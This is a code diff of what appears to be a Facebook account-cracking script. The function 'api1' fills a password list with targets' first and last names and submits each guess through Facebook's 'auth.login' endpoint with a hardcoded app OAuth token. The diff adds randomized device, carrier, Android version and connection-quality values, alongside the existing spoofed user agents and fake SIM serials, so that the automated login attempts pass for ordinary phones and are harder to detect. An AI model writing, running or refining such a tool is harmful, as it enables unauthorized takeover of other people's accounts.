@@ -9,7 +9,11 @@ def api1(ids,names,passlist,total_ids):
             ln = fn
         for pw in passlist:
             pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
+            facebook_version = f"{random.randint(100, 200)}.0.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
+            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
+            network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
+            network_carrier = random.choice(network_carriers)
             random_seed = random.Random()
             adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
             ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"            
@@ -20,7 +24,7 @@ def api1(ids,names,passlist,total_ids):
 'Priority': 'u=3, i',
 'X-Fb-Sim-Hni': '31002',
 'X-Fb-Net-Hni': '31002',
-'X-Fb-Connection-Quality': 'GOOD',
+'X-Fb-Connection-Quality': quality,
 'Zero-Rated': '0',
 'User-Agent':  ua,
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -44,6 +48,9 @@ def api1(ids,names,passlist,total_ids):
 'email': ids,
 'password': pas,
 'method': 'auth.login',
+'android_version': f'{android_version}',
+'carrier': f'{network_carrier}',
+'app_version': f'{facebook_version}',
 'generate_session_cookies': '1',
 'sim_serials': "['80973453345210784798']",
 'openid_flow': 'android_login',
